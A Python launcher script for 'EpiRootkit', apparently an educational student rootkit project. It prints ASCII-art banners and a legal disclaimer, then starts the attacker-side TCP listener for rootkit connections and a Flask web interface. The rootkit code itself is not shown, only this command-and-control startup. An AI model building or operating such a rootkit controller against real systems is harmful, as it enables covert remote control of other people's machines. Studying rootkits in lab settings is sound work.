from utils.BigMama import BigMama
import config as cfg
import threading
from app import app

def main():
    print(r"""
                                                      
                       ▓▓                                  █▓█       
                         ▓▓                               ▓▓         
                          ▓▓                            ▓▓           
                            ▓▓                        █▓█            
                              ▓▓                     ▓▓              
                               ▓▓       ▓▓▓▓█      ▓▓                
                                 ▓▓  ▓▓▒▓▓▓▓▓▓▓  ▓▓                  
                                   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓            ▓      
                        ▓▓▓       ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█        ▓▓▓       
                       ▓▓▓▓      ████▓▓▓▓▓▓▓▓▓▓████       ▓▓▓        
                        ▓▓▓     ▓▓▓█████▓▓▓▓██████▓▓     ▓▓▓█        
                        ▓▓▓   ▓▓▓▓▓▓▓█████████▓▓▓▓▓▓▓▓   ▓▓▓         
                         ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓          
                          ███▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓███           
                           █████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████            
                           ▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▓            
                        ▓▓▓▓▓▓▓▓▓▓███▓▓▓▓▓▓▓▓▓▓▓████▓▓▓▓▓▓▓▓         
                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓███▓▓▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓▓█     
                    ▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓████████▓▓▓▓▓▓▓▓▓▓   █▓▓▓     
                   ▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓    
                 ▓▓▓█     ▓▓▓▓▓▓▓▓▓▓▓▓▓█████▓▓▓▓▓▓▓▓▓▓▓▓      ▓▓▓   
                 ▓▓▓▓      ▓▓▓▓▓▓▓▓▓▓▓███▓▓▓██▓▓▓▓▓▓▓▓▓▓▓       ▓▓▓  
                ▓▓       ██▓▓▓▓▓▓▓▓▓███▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓▓██       █▓ 
                       ████▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓▓▓███▓▓▓▓▓▓▓████        
                      █████ ▓▓▓▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓███▓██      
                    █▓██   ▓▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓    █▓▓      
                      ▓▓▓    ▓███▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓    ▓▓▓      
                     ▓▓▓█    █▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓      
                     ▓▓▓█      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓       ▓▓▓      
                    ▓▓▓         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓         █▓▓      
                     ▓▓            ▓▓▓▓▓▓▓▓▓▓▓▓▓▓            ▓▓      
                      ▓               ▓▓▓▓▓▓▓▓▓▓               ▓      
                                        ▓▓▓▓                         


    

 .oooooo..o ooooooooooooo oooooooooo.   oooooooooo.    .oooooo.     .oooooo.   ooooo       
d8P'    `Y8 8'   888   `8 `888'   `Y8b  `888'   `Y8b  d8P'  `Y8b   d8P'  `Y8b  `888'       
Y88bo.           888       888      888  888     888 888      888 888      888  888        
 `"Y8888o.       888       888      888  888oooo888' 888      888 888      888  888        
     `"Y88b      888       888      888  888    `88b 888      888 888      888  888        
oo     .d8P      888       888     d88'  888    .88P `88b    d88' `88b    d88'  888       o
8""88888P'      o888o     o888bood8P'   o888bood8P'   `Y8bood8P'   `Y8bood8P'  o888ooooood8




                                                                888   
                                                                888   
                                                                888   
            88888b.  888d888 .d88b.  .d8888b   .d88b.  88888b.  888888 .d8888b
            888 "88b 888P"  d8P  Y8b 88K      d8P  Y8b 888 "88b 888    88K
            888 d88P 888    Y8b.          X88 Y8b.     888  888 Y88b.       X88
            888  888 888    88888888 "Y8888b. 88888888 888  888 888    "Y8888b.
            88888P"  888     "Y8888   88888P'  "Y8888  888  888  "Y888  88888P'
            888                                                       
            888                                                       
            888                                                       




 /$$$$$$$$           /$$ /$$$$$$$                        /$$     /$$   /$$ /$$   /$$    
| $$_____/          |__/| $$__  $$                      | $$    | $$  /$$/|__/  | $$    
| $$        /$$$$$$  /$$| $$  \ $$  /$$$$$$   /$$$$$$  /$$$$$$  | $$ /$$/  /$$ /$$$$$$  
| $$$$$    /$$__  $$| $$| $$$$$$$/ /$$__  $$ /$$__  $$|_  $$_/  | $$$$$/  | $$|_  $$_/  
| $$__/   | $$  \ $$| $$| $$__  $$| $$  \ $$| $$  \ $$  | $$    | $$  $$  | $$  | $$    
| $$      | $$  | $$| $$| $$  \ $$| $$  | $$| $$  | $$  | $$ /$$| $$\  $$ | $$  | $$ /$$
| $$$$$$$$| $$$$$$$/| $$| $$  | $$|  $$$$$$/|  $$$$$$/  |  $$$$/| $$ \  $$| $$  |  $$$$/
|________/| $$____/ |__/|__/  |__/ \______/  \______/    \___/  |__/  \__/|__/   \___/  
          | $$                                                                          
          | $$                                                                          
          |__/                                                                                                                        
    """)


    
    print("Starting EpiRootkit attacking program...")
    print("EpiRootkit is a rootkit for educational purposes only.")
    print("It is designed to be used in a controlled environment, such as a virtual machine.")
    print("It is illegal to use this rootkit on a system you do not own or have permission to test.")
    print("EpiRootkit is not responsible for any damage caused by its use.")
    print("Starting the server...")
    cfg.rootkit_connexion = BigMama(tcp_host=cfg.HOST, tcp_port=cfg.PORT)
    cfg.rootkit_connexion.start()
    app.run(host='0.0.0.0', port=5000)
        
if __name__ == '__main__':
    main()